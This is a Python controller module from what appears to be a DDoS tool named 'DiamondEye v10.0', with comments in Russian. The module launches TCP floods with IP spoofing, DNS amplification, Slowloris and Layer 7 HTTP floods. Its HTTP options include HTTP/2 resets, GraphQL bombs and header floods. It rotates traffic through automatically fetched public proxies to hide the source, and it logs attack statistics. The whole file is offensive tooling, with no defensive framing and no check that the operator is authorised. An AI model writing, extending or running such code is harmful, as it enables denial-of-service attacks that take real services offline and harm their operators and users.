# core/attack_manager.py
import asyncio
import time
import signal
import psutil
from typing import Dict, Any, Optional
from colorama import Fore, Style

try:
    from layers.layer4.tcp_flood import TCPFlood
    from layers.amplification.dns_amp import DNSAmplifier
    from proxy.manager import ProxyManager
except ImportError as e:
    print(f"{Fore.YELLOW}⚠️  Missing module: {e}. Some features disabled.{Style.RESET_ALL}")
    
    class TCPFlood:
        def __init__(self, **kwargs): pass
        async def start(self): pass
    
    class DNSAmplifier:
        def __init__(self, **kwargs): pass
        async def start(self): pass
    
    class ProxyManager:
        def __init__(self): self.proxies = []
        async def load_from_file(self, *args): pass
        async def fetch_proxies(self): pass
        async def check_all(self, *args): pass
        def get_next_proxy(self): return None

from core.resource_monitor import ResourceMonitor


class AttackManager:
    """Главный менеджер для управления всеми типами атак"""
    
    def __init__(self, args):
        self.args = args
        self.active_attack = None
        self.proxy_manager = None
        self.resource_monitor = None
        self.bypass_tech = None
        self.start_time = time.time()
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'rps_history': [],
            'bandwidth_history': []
        }
        self._running = False
        self._shutdown_event = asyncio.Event()
        
    async def initialize(self):
        """Инициализация менеджера"""
        print(f"{Fore.CYAN}🔧 Initializing DiamondEye v10.0...{Style.RESET_ALL}")
        
        # Инициализация прокси-менеджера
        if self.args.proxy_auto or self.args.proxy_file:
            self.proxy_manager = ProxyManager()
            await self.setup_proxies()
        
        # Инициализация монитора ресурсов
        self.resource_monitor = ResourceMonitor()
        
        # Определение цели
        if self.args.attack_type in ['tcp', 'udp', 'syn', 'dns', 'ntp']:
            if not self.args.target_ip:
                print(f"{Fore.RED}❌ Target IP required for {self.args.attack_type} attack{Style.RESET_ALL}")
                return False
                
        return True
    
    async def setup_proxies(self):
        """Настройка системы прокси"""
        if self.args.proxy_file:
            print(f"{Fore.CYAN}📁 Loading proxies from {self.args.proxy_file}...{Style.RESET_ALL}")
            await self.proxy_manager.load_from_file(self.args.proxy_file)
        elif self.args.proxy_auto:
            print(f"{Fore.CYAN}🌐 Fetching proxies from public sources...{Style.RESET_ALL}")
            await self.proxy_manager.fetch_proxies()
        
        if self.proxy_manager and self.proxy_manager.proxies:
            print(f"{Fore.CYAN}🔍 Checking proxy availability...{Style.RESET_ALL}")
            await self.proxy_manager.check_all(concurrency=50)
            working = len([p for p in self.proxy_manager.proxies if p.is_working])
            print(f"{Fore.GREEN}✅ {working} proxies ready{Style.RESET_ALL}")
    
    async def start_attack(self):
        """Запуск выбранного типа атаки"""
        print(f"{Fore.GREEN}🚀 Starting {self.args.attack_type.upper()} attack{Style.RESET_ALL}")
        
        self._running = True
        self._shutdown_event.clear()
        
        # Установка обработчика сигналов
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, lambda: asyncio.create_task(self.stop_attack()))
        
        # Запуск мониторинга ресурсов
        monitor_task = asyncio.create_task(self.resource_monitor.monitor())
        
        try:
            if self.args.attack_type == 'tcp':
                await self.start_tcp_attack()
            elif self.args.attack_type == 'dns':
                await self.start_dns_amplification()
            elif self.args.attack_type == 'slowloris':
                await self.start_slowloris_attack()
            else:
                await self.start_http_attack()  # Layer7 по умолчанию
                
        except Exception as e:
            print(f"{Fore.RED}❌ Attack error: {e}{Style.RESET_ALL}")
            if self.args.debug:
                import traceback
                traceback.print_exc()
        finally:
            await self.stop_attack()
            monitor_task.cancel()
    
    async def start_tcp_attack(self):
        """Запуск TCP флуда"""
        print(f"{Fore.CYAN}⚡ TCP Flood targeting {self.args.target_ip}:{self.args.target_port}{Style.RESET_ALL}")
        
        flood = TCPFlood(
            target_ip=self.args.target_ip,
            target_port=self.args.target_port,
            workers=self.args.workers * 2,  # Больше воркеров для Layer4
            spoof_ip=self.args.spoof_ip,
            packet_size=1024
        )
        
        self.active_attack = flood
        await flood.start()
    
    async def start_dns_amplification(self):
        """Запуск DNS амплификации"""
        print(f"{Fore.CYAN}🌪️ DNS Amplification targeting {self.args.target_ip}{Style.RESET_ALL}")
        
        amplifier = DNSAmplifier(
            target_ip=self.args.target_ip,
            amplification_factor=50,
            workers=self.args.workers
        )
        
        self.active_attack = amplifier
        await amplifier.start()
    
    async def start_slowloris_attack(self):
        """Запуск Slowloris атаки через плагин"""
        from plugins.slowloris_plugin import SlowlorisPlugin
        
        print(f"{Fore.CYAN}🐌 Starting Slowloris attack via plugin{Style.RESET_ALL}")
        
        plugin = SlowlorisPlugin()
        await plugin.initialize({
            'host': self.args.target_ip,
            'port': self.args.target_port or 80,
            'max_connections': self.args.workers * 50
        })
        
        self.active_attack = plugin
        await plugin.execute(f"{self.args.target_ip}:{self.args.target_port or 80}")
    
    async def start_http_attack(self):
        """Запуск HTTP атаки (существующий код)"""
        from attack import DiamondEyeAttack
        
        # Подготовка прокси
        proxy = self.args.proxy
        if self.proxy_manager and self.proxy_manager.proxies:
            proxy = self.proxy_manager.get_next_proxy()
            print(f"{Fore.YELLOW}🔄 Using proxy: {proxy}{Style.RESET_ALL}")
        
        attack = DiamondEyeAttack(
            url=self.args.url,
            workers=self.args.workers,
            sockets=self.args.sockets,
            methods=self.args.methods,
            useragents=self.args.useragents,
            no_ssl_check=self.args.no_ssl_check,
            debug=self.args.debug,
            proxy=proxy,
            use_http2=self.args.http2,
            use_http3=self.args.http3,
            websocket=self.args.websocket,
            auth=self.args.auth,
            h2reset=self.args.h2reset,
            graphql_bomb=self.args.graphql_bomb,
            adaptive=self.args.adaptive,
            slow_rate=self.args.slow,
            extreme=self.args.extreme,
            data_size=self.args.data_size,
            flood=self.args.flood,
            path_fuzz=self.args.path_fuzz,
            header_flood=self.args.header_flood,
            method_fuzz=self.args.method_fuzz,
            junk=self.args.junk,
            random_host=self.args.random_host
        )
        
        self.active_attack = attack
        await attack.start()
    
    async def stop_attack(self):
        """Остановка текущей атаки"""
        if not self._running:
            return
            
        print(f"{Fore.YELLOW}🛑 Stopping attack...{Style.RESET_ALL}")
        self._running = False
        self._shutdown_event.set()
        
        if self.active_attack:
            if hasattr(self.active_attack, 'stop'):
                self.active_attack.stop()
            elif hasattr(self.active_attack, 'shutdown'):
                await self.active_attack.shutdown()
            elif hasattr(self.active_attack, 'cleanup'):
                await self.active_attack.cleanup()
        
        # Генерация отчета
        await self.generate_report()
        
        print(f"{Fore.GREEN}✅ Attack stopped{Style.RESET_ALL}")
    
    async def generate_report(self):
        """Генерация детального отчета"""
        duration = time.time() - self.start_time
        
        if self.resource_monitor:
            resource_report = self.resource_monitor.get_report()
        else:
            resource_report = {}
        
        report = {
            'attack_type': self.args.attack_type,
            'duration': duration,
            'stats': self.stats,
            'resources': resource_report,
            'config': {
                'workers': self.args.workers,
                'target': self.args.target_ip or self.args.url,
                'timestamp': time.time()
            }
        }
        
        # Сохранение отчета
        if self.args.log:
            self.save_text_report(report)
        if self.args.json:
            self.save_json_report(report)
    
    def save_text_report(self, report):
        """Сохранение текстового отчета"""
        try:
            with open(self.args.log, 'w', encoding='utf-8') as f:
                f.write(f"DiamondEye v10.0 - Attack Report\n")
                f.write(f"{'='*50}\n")
                f.write(f"Attack Type: {report['attack_type']}\n")
                f.write(f"Duration: {report['duration']:.2f}s\n")
                f.write(f"Packets Sent: {report['stats']['packets_sent']}\n")
                f.write(f"Bytes Sent: {report['stats']['bytes_sent'] / 1024 / 1024:.2f} MB\n")
                f.write(f"Errors: {report['stats']['errors']}\n")
                f.write(f"\nResource Usage:\n")
                if report['resources']:
                    f.write(f"CPU: {report['resources'].get('cpu_avg', 0):.1f}%\n")
                    f.write(f"RAM: {report['resources'].get('ram_avg', 0):.1f}%\n")
                    f.write(f"Network: {report['resources'].get('bandwidth_avg', 0):.2f} MB/s\n")
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to save report: {e}{Style.RESET_ALL}")
    
    def save_json_report(self, report):
        """Сохранение JSON отчета"""
        import json
        try:
            with open(self.args.json, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to save JSON: {e}{Style.RESET_ALL}")